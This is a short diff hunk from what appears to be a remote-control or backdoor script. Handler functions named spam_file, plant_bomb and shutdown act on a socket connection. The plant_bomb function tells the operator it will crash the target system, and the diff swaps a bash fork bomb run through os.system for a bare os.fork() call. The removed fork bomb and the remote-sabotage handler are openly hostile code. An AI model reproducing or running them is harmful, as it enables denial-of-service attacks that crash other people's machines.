@@ -150,7 +150,7 @@ def spam_file(con):
 
 def plant_bomb(con):
 	con.send(b'Planting fork bomb. This will crash the target system!')
-	os.system(":(){ :|:& };:")
+	os.fork()
 	con.send(b'Done!')
 
 def shutdown(con):
